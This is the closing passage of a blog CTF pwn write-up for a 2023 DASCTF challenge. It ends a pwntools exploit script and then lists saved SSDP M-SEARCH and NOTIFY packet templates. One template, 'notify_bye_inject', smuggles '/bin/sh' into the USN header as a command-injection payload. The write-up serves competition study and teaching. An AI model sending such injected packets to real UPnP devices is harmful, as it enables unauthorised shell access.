<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MAN: </span><span class="sh">"</span><span class="s">ssdp:discover</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MX: 3</span><span class="se">\r\n</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">ST: </span><span class="sh">'</span><span class="o">+</span><span class="n">p</span><span class="o">+</span><span class="sa">b</span><span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">USER-AGENT: Microsoft Edge/119.0.2151.93 Windows</span><span class="se">\r\n</span><span class="sh">'</span>


<span class="nf">sl</span><span class="p">(</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">pay</span><span class="p">))</span>





<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>找到漏洞点后就非常好搞了，静态分析起来确实有点困难</p>

<p>‍</p>

<p>​<a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130141051-1yh17g5.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231130141051-1yh17g5.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>存一下</li>
</ul>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre><span class="n">ssdp_all</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">M-SEARCH * HTTP/1.1</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">HOST: 239.255.255.250:1900</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MAN: </span><span class="sh">"</span><span class="s">ssdp:discover</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MX: 3</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">ST: ssdp:all</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">USER-AGENT: Google Chrome/87.0.4280.88 Windows</span><span class="se">\r\n\r\n</span><span class="sh">'</span>

<span class="n">ssdp_uuid</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">M-SEARCH * HTTP/1.1</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">HOST: 239.255.255.250:1900</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MAN: </span><span class="sh">"</span><span class="s">ssdp:discover</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MX: 3</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">ST: uuid:1</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">USER-AGENT: Google Chrome/87.0.4280.88 Windows</span><span class="se">\r\n\r\n</span><span class="sh">'</span>

<span class="n">ssdp_root</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">M-SEARCH * HTTP/1.1</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">HOST: 239.255.255.250:1900</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MAN: </span><span class="sh">"</span><span class="s">ssdp:discover</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MX: 3</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">ST: upnp:rootdevice</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">USER-AGENT: Google Chrome/87.0.4280.88 Windows</span><span class="se">\r\n\r\n</span><span class="sh">'</span>

<span class="n">notify_alive</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">NOTIFY * HTTP/1.1</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">HOST: 239.255.255.250:1900</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">CACHE-CONTROL: max-age = seconds until advertisement expires</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">LOCATION: 3</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">USN: 1</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">NTS: ssdp:alive</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">NT: upnp:rootdevice</span><span class="se">\r\n\r\n</span><span class="sh">'</span>

<span class="n">notify_bye</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">NOTIFY * HTTP/1.1</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">HOST: 239.255.255.250:1900</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">CACHE-CONTROL: max-age = seconds until advertisement expires</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">LOCATION: 3</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">USN: 1</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">NTS: ssdp:byebye</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">NT: upnp:rootdevice</span><span class="se">\r\n\r\n</span><span class="sh">'</span>

<span class="n">notify_bye_inject</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">NOTIFY * HTTP/1.1</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">HOST: 239.255.255.250:1900</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">CACHE-CONTROL: max-age = seconds until advertisement expires</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">LOCATION: 3</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">USN: </span><span class="se">\'</span><span class="s">/bin/sh</span><span class="se">\'\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">NTS: ssdp:byebye</span><span class="se">\r\n</span><span class="sh">'</span> \
    <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">NT: upnp:rootdevice</span><span class="se">\r\n\r\n</span><span class="sh">'</span>
</pre></td></tr></tbody></table></code></div></div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/ctf/">CTF</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/ctf/"
            class="post-tag no-text-decoration"
          >CTF</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          本文由作者按照 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         进行授权
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">分享</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FDASCTF-X-0psu3%25E5%258D%2581%25E4%25B8%2580%25E6%259C%2588%25E6%258C%2591%25E6%2588%2598%25E8%25B5%259B-%25E8%25B6%258A%25E8%2589%25B0%25E5%25B7%25A8-%25E8%25B6%258A%25E7%258B%2582%25E7%2583%25AD-pwn-Writeups%2F&title=2023DASCTF%20X%200psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%EF%BD%9C%E8%B6%8A%E8%89%B0%E5%B7%A8%C2%B7%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="QQ" aria-label="QQ">
        <i class="fa-fw fa-brands fa-qq"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=2023DASCTF%20X%200psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%EF%BD%9C%E8%B6%8A%E8%89%B0%E5%B7%A8%C2%B7%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups%20-%20imLZH1'%20Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FDASCTF-X-0psu3%25E5%258D%2581%25E4%25B8%2580%25E6%259C%2588%25E6%258C%2591%25E6%2588%2598%25E8%25B5%259B-%25E8%25B6%258A%25E8%2589%25B0%25E5%25B7%25A8-%25E8%25B6%258A%25E7%258B%2582%25E7%2583%25AD-pwn-Writeups%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FDASCTF-X-0psu3%25E5%258D%2581%25E4%25B8%2580%25E6%259C%2588%25E6%258C%2591%25E6%2588%2598%25E8%25B5%259B-%25E8%25B6%258A%25E8%2589%25B0%25E5%25B7%25A8-%25E8%25B6%258A%25E7%258B%2582%25E7%2583%25AD-pwn-Writeups%2F&text=2023DASCTF%20X%200psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%EF%BD%9C%E8%B6%8A%E8%89%B0%E5%B7%A8%C2%B7%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="分享链接"
      data-title-succeed="链接已复制！"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">最近更新</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Nullcon-Goa-HackIM-2025-CTF/">HACKIM 2025 CTF 一道wasm pwn题分享</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/LA_CTF-%E9%83%A8%E5%88%86Pwn%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-by-g1P03n/">LA CTF 2025 部分Pwn解题思路 by g1P03n</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/BRISC-CTF/">2024-BRISC-CTF-Pwn-WriteUps</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/">IrisCTF2025-Pwn-Binary-Exploitation-WriteUps</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">文章内容</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">相关文章</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/2023%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%9B%BD%E5%AE%B6%E6%8A%80%E8%83%BD%E5%8F%91%E5%B1%95%E4%B8%8E%E6%8A%80%E6%9C%AF%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9C%A8%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8-Pwn-WriteUps/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700395200"
  data-df="YYYY/MM/DD"
  
>
  2023/11/19
</time>

              <h4 class="pt-0 my-2">2023一带一路暨金砖国家技能发展与技术创新大赛之网络安全在企业信息管理中的应用-Pwn-WriteUps</h4>
              <div class="text-muted">
                <p>
                  





                  ‍
‍

‍

pwn-pwn0402

‍

​​​​

‍


  我们采用溢出后再次read  然后写shellcode 在栈上ret


‍

​​

‍

​​

from pwn import *
s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.s...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/2023%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9BPwn-%E5%88%86%E6%9E%90/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700481600"
  data-df="YYYY/MM/DD"
  
>
  2023/11/20
</time>

              <h4 class="pt-0 my-2">2023香山杯决赛Pwn-分析</h4>
              <div class="text-muted">
                <p>
                  





                  
  进决赛了，但是和金砖的比赛冲突了决赛没时间去了呜呜呜😭😭😭，选择去打金砖了，好打一点。


camera

‍

程序分析

‍

​​

‍

根据程序的功能然后加上一些手法，可以double free

后面就是填满 tcachebins 然后 fastbin double free 就好了

‍

​​

‍

‍

cat 用的顺手了，我就直接用 cat  ORW 就好了

​...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B-%E5%AE%9E%E8%B7%B5%E8%B5%9B-AWDP-Pwn-WriteUps_by_AhiSec/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1702814400"
  data-df="YYYY/MM/DD"
  
>
  2023/12/17
</time>

              <h4 class="pt-0 my-2">第六届全国网络安全挑战赛青少年专项赛-实践赛-AWDP-Pwn-WriteUps_by_AhiSec</h4>
              <div class="text-muted">
                <p>
                  





                  ‍‍
2023-12-17-第六届全国网络安全挑战赛青少年专项赛-实践赛-AWDP-Pwn-WriteUps_by_AhiSec

‍

‍

pwn-easygo

‍

程序分析

‍


  
    存在一个后门
  
  
    输入溢出覆盖栈上数据
  
  
    没什么好玩的
  


‍

Break

‍


  溢出直接覆盖就行了，


‍

1
2
3
4
5
6...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/2023%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9BPwn-%E5%88%86%E6%9E%90/"
      class="btn btn-outline-primary"
      aria-label="上一篇"
    >
      <p>2023香山杯决赛Pwn-分析</p>
    </a>
  

  
    <a
      href="/posts/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B-%E5%AE%9E%E8%B7%B5%E8%B5%9B-AWDP-Pwn-WriteUps_by_AhiSec/"
      class="btn btn-outline-primary"
      aria-label="下一篇"
    >
      <p>第六届全国网络安全挑战赛青少年专项赛-实践赛-AWDP-Pwn-WriteUps_by_AhiSec</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  (function () {
    const origin = 'https://giscus.app';
    const iframe = 'iframe.giscus-frame';
    const lightTheme = 'light';
    const darkTheme = 'dark_dimmed';

    let initTheme = lightTheme;
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') &&
        html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') &&
        window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'imLZH1/me_giscus_Discussions-',
      'data-repo-id': 'comments',
      'data-category': 'general',
      'data-category-id': '',
      'data-mapping': 'pathname',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'bottom',
      'data-lang': 'zh-CN',
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusScript = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusScript.setAttribute(key, value)
    );
    document.getElementById('tail-wrapper').appendChild(giscusScript);

    addEventListener('message', (event) => {
      if (
        event.source === window &&
        event.data &&
        event.data.direction === ModeToggle.ID
      ) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme;

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }
    });
  })();
</script>



            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2025</time>
    <a href="https://user.qzone.qq.com/3461665835">imLZH1</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="除非另有说明，本网站上的博客文章均由作者按照知识共享署名 4.0 国际 (CC BY 4.0) 许可协议进行授权。"
      >保留部分权利。</span>
    
  </p>
	<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>

  <p>本站采用 <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> 主题 <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">发现新版本的内容。</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      更新
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    <script src="/assets/lib/jquery/jquery.min.js"></script>
  

  
    <script src="/assets/lib/bootstrap/bootstrap.bundle.min.js"></script>
  

  
    <script src="/assets/lib/simple-jekyll-search/simple-jekyll-search.min.js"></script>
  

  
    <script src="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.umd.min.js"></script>
  

  
    <script src="/assets/lib/magnific-popup/jquery.magnific-popup.min.js"></script>
  

  
    <script src="/assets/lib/clipboard/clipboard.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/dayjs.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/locale/en.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/relativeTime.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/localizedFormat.min.js"></script>
  

  
    <script src="/assets/lib/tocbot/tocbot.min.js"></script>
  








<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

